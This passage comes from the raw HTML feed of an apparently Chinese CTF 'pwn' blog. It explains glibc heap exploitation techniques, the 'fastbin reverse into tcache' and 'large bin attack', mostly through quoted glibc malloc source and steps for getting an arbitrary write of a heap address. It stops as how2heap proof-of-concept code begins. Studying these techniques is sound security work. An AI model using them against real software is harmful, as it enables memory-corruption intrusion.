class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">    *fb = victim-&gt;fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    REMOVE_FB (fb, pp, victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">      check_remalloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment"> stash them in the tcache.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当我们<code>malloc</code>的堆块属于<code>fastbin</code>大小的时候，就会进入这个分支。当相应的<code>fastbin</code>中有<code>chunk</code>,并且有两个及以上的时候，就把需要的取出给用户，剩余的放入空闲的<code>tcache bin</code>,具体实施的函数就是<code>tcache_put (tc_victim, tc_idx)</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">     <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">     <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line"> &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">*fb = tc_victim-&gt;fd;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而<code>tcache_put</code>的实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们只要构造两个在<code>fastbin</code>中的<code>chunk</code>,然后修改后面一个<code>chunk</code>(前面<code>chunk</code>的<code>fd</code>指向后面的<code>chunk</code>)的<code>fd</code>为<code>target-0x10</code>,然后再绕过往<code>tcachebin</code>中取<code>chunk</code>的判定(绕过的条件前面以说明)。然后再<code>malloc</code>这个大小的<code>chunk</code>。当检测到<code>fastbin</code>中还有数据，并且<code>tcachebin</code>数据不满的时候，会将<code>fastbin</code>剩下的<code>chunk</code>逆序链入<code>tcachebin</code>。由于修改了后一个<code>chunk</code>的<code>fd</code>为<code>target-0x10</code> ，那么最后会执行<code>tcache_put (target-0x10, tc_idx)</code>,而后执行<code>e-&gt;next = tcache-&gt;entries[tc_idx]</code>的时候，就会将前一个<code>chunk</code>的地址写入<code>(target-0x10)-&gt;next</code>（在这之前有个强制转换成<code>(tcache_entry *)</code>以及<code>chunk2mem</code>的过程,具体的结构体声明以及这个宏的作用就不赘述了)也就是<code>target</code>处。同时由于<code>target</code>这个附近的<code>chunk</code>被放入了<code>tcache bin</code>中(<code>tcache-&gt;entries[tc_idx] = e</code>)所以我们可以申请它</p><p>而<code>glibc2.31</code>及以上就稍有不同，对于<code>target</code>取得偏移也不是<code>0x10</code>了而是<code>0x18</code>，因为存在了对<code>fd</code>指针的加密操作，所以写上的也不是一个堆地址。同时也不能直接让<code>tcache-&gt;entries[tc_idx] == NULL</code> 来绕过取<code>tchache bin</code> 的判断，因为判断条件更改了。而<code>0x18</code>这个偏移对应的是<code>tcache_entry *</code>的<code>key</code>字段。这个在不同版本似乎也有区别。在<code>glibc2.29</code>（应该是<code>glibc2.27 1.4</code>版本朝上)的时候，这个<code>key</code>字段是<code>&amp;tcache</code>，而我在看<code>glibc2.35</code>源码的时候，这个<code>key</code>已经变成了一个完全的随机数了。所以写堆地址这块算是没戏了，不过还是有办法进行申请<code>chunk</code></p><p>这里贴一下不同，首先是对于是从<code>tcache bin</code>中取出还是调用<code>_int_malloc</code>从其他<code>bin</code>中取出,判定条件变成了<code>tc_idx &lt; mp_.tcache_bins&amp;&amp; tcache&amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    victim = tcache_get (tc_idx);</span><br><span class="line">    <span class="keyword">return</span> tag_new_usable (victim);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>加入了指针加密操作(<code>fastbin</code>的<code>fd</code>指针也做了相同的加密)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="keyword">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="keyword">size_t</span>) ptr)))</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure><p>还有<code>key</code>字段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其初始化如下，为一个随机数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">tcache_key_initialize (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__getrandom (&amp;tcache_key, <span class="keyword">sizeof</span>(tcache_key), GRND_NONBLOCK)</span><br><span class="line">      != <span class="keyword">sizeof</span> (tcache_key))</span><br><span class="line">    &#123;</span><br><span class="line">      tcache_key = random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line">      tcache_key = (tcache_key &lt;&lt; <span class="number">32</span>) | random_bits ();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些摘自<code>glibc2.35</code>的源码，事实上打补丁有循序渐进的过程，不同版本的具体实施不太一样</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;源码分析&quot;&gt;&lt;a href=&quot;#源码分析&quot; class=&quot;headerlink&quot; title=&quot;源码分析&quot;&gt;&lt;/a&gt;源码分析&lt;/h2&gt;&lt;p&gt;上次祥云杯中遇到了&lt;code&gt;fastbin reverse into tcache&lt;/code&gt;的利用手法，这里简单分析一</summary>
      
    
    
    
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
    <category term="heap" scheme="http://phot0n.com/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>large_bin_attack</title>
    <link href="http://phot0n.com/2022/11/11/large-bin-attack/"/>
    <id>http://phot0n.com/2022/11/11/large-bin-attack/</id>
    <published>2022-11-11T14:06:02.000Z</published>
    <updated>2022-11-11T16:22:02.763Z</updated>
    
    <content type="html"><![CDATA[<p>这里学习一下<code>large bin attack</code>,主要是<code>glibc2.31</code> 下面的利用</p><h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>那么首先看一下在<code>_int_malloc</code>中取<code>large_chunk</code>的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">victim_index = largebin_index (size);</span><br><span class="line">bck = bin_at (av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"><span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line"><span class="keyword">if</span> (fwd != bck)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">    size |= PREV_INUSE;</span><br><span class="line">    <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">    assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">        &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd = bck;</span><br><span class="line">        bck = bck-&gt;bk;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">        <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">        &#123;</span><br><span class="line">            fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">            assert (chunk_main_arena (fwd));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">            == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">            <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">            fwd = fwd-&gt;fd;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            victim-&gt;fd_nextsize = fwd;</span><br><span class="line">            victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">            fwd-&gt;bk_nextsize = victim;</span><br><span class="line">            victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">        &#125;</span><br><span class="line">        bck = fwd-&gt;bk;</span><br><span class="line">        <span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这段代码是对处于<code>unsorted bin</code>的<code>chunk</code>进行归类(也就是代码中的<code>victim</code> ，然后如果该<code>chunk</code>的<code>size</code>在<code>large bin</code>之间的时候，对其进行的操作</p><p>我们首先要知道<code>large bin</code> 是如何组织的,不同于普通的<code>chunk</code>,在组织的时候每个属于<code>large bin</code> 的<code>chunk</code>会使用起他们的<code>fd_nextsize</code>以及<code>bk_nextsize</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们知道，对于<code>fast bin</code> 以及<code>tcache bin</code> ，每个<code>bin</code>组织起来的<code>chunk</code> 的大小都是一样的，而<code>unsorted bin</code> 中的<code>chunk</code> 虽然大小不一样，但却只有一个<code>bin</code> 。而对于<code>large bin</code>来说，他的每个<code>bin</code>组织起的是一系列一段大小范围内的<code>chunk</code> ，这个大小取决于<code>index</code> </p><p>用一个图来描述的话大概就是长这样(不要在意我的渣画工)</p><p><img src="https://s2.loli.net/2022/11/11/lokdnYPOrqBV82M.jpg" alt=""></p><p>每个相同大小的<code>chunk</code>用<code>fd</code> 和<code>bk</code>相连，不同大小的话就会用<code>fd_nextsize</code>和<code>bk_nextsize</code>相连。而且只有首堆的<code>fd_nextsize</code>和<code>bk_nextsize</code>会指向其他堆块，其他的相同大小的<code>chunk</code> 并不使用这两个域。</p><p>而且首堆的<code>fd_nextsize</code>指向的是比自己小的最大的那个<code>chunk</code>,<code>bk_nextsize</code>指向的是比自己大的最小的那个<code>chunk</code> (这么解释很精确，但是有点绕。简单来说就是沿<code>fd_nextsize</code>每个<code>chunk</code>的大小递减，除了最小的那个<code>chunk</code>的<code>fd_nextsize</code>指向的是最大的。<code>bk_nextsize</code>同理)</p><p>那么我们来分析当有合适大小的<code>chunk</code>加入<code>large bin</code> 时会如何。</p><p>首先执行如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">victim_index = largebin_index (size);<span class="comment">/*查找该size属于的bin范围，返回index*/</span></span><br><span class="line">bck = bin_at (av, victim_index);<span class="comment">/*取得bin*/</span></span><br><span class="line">fwd = bck-&gt;fd;</span><br></pre></td></tr></table></figure><p>然后通过<code>fwd != bck</code>判断这个<code>bin</code>是不是非空，我们主要看非空的情况。如果这个<code>chunk</code>的大小比该<code>bin</code>中所有<code>chunk</code>都小(因为<code>bin</code>的<code>bk</code>实际上指向了该<code>bin</code>中最小的<code>chunk</code>,所以最小<code>chunk</code>的大小为<code>chunksize_nomask (bck-&gt;bk)</code>),就会执行如下语句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是将这个新的最小的<code>chunk</code> 新加到末尾，那么它的<code>fd_nextsize</code>也就指向最大的<code>chunk</code>，也就是<code>bck-&gt;fd</code>,它的<code>bk_nextsize</code>指向原来的最小的<code>chunk</code> 也就是<code>fwd-&gt;fd-&gt;bk_nextsize</code> ,然后再修改原来那个最小的<code>chunk</code>的<code>fd_nextsize</code>指向新的最小的<code>chunk</code>(也就是<code>victim</code>),最大的<code>chunk</code>的<code>bk_nextsize</code>指向新的最小的<code>chunk</code>也就是<code>victim</code></p><p><strong>事实上我们后面进行的<code>large bin attack</code>就是对这段代码的利用</strong> 。不过为了叙述完整我们将剩余的代码也一并分析了</p><p>如果这个<code>chunk</code>的大小并不比该<code>bin</code>中所有<code>chunk</code>都小，就会执行如下语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    assert (chunk_main_arena (fwd));</span><br><span class="line">    while ((unsigned long) size &lt; chunksize_nomask (fwd))</span><br><span class="line">    &#123;</span><br><span class="line">        fwd &#x3D; fwd-&gt;fd_nextsize;</span><br><span class="line">        assert (chunk_main_arena (fwd));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ((unsigned long) size</span><br><span class="line">        &#x3D;&#x3D; (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">        &#x2F;* Always insert in the second position.  *&#x2F;</span><br><span class="line">        fwd &#x3D; fwd-&gt;fd;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        victim-&gt;fd_nextsize &#x3D; fwd;</span><br><span class="line">        victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;</span><br><span class="line">        if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize !&#x3D; fwd))</span><br><span class="line">            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">        fwd-&gt;bk_nextsize &#x3D; victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck &#x3D; fwd-&gt;bk;</span><br><span class="line">    if (bck-&gt;fd !&#x3D; fwd)</span><br><span class="line">        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过这段语句找到小于等于新加<code>chunk</code>(也就是<code>victim</code>) 的第一个<code>chunk</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">    assert (chunk_main_arena (fwd));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后判断是否相等</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size== (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line"><span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">fwd = fwd-&gt;fd;</span><br></pre></td></tr></table></figure><p>因为我们前面说到，相同大小的<code>chunk</code>是用<code>fd</code>和<code>bk</code>相连的，而且除了首堆外用不到<code>fd_nextsize</code>以及<code>bk_nextsize</code></p><p>如果不相等的话，就要插进去，作新的一组相同大小<code>chunk</code>的首堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是插入的过程，也相对比较好懂，就不详细分析了。值得注意的是，这里多了一个链表双向性检查，在<code>glibc2.30</code>之前是没有的，所以其实是封住了一种利用</p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>我们攻击的利用条件是有<code>UAF</code> ，效果就是在任意地址写一个堆地址,以便进行后续利用(比如进行<code>FSOP</code>之类的)</p><p>主要针对的是这个过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)&lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也就是当新插入的<code>chunk</code>比原先<code>bin</code>中所有<code>chunk</code>的<code>size</code>都小的时候发生的</p><p>这里贴一下来自<code>shellphish</code>的<code>how2heap</code>代码，可以在<code>github</code>上面搜到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 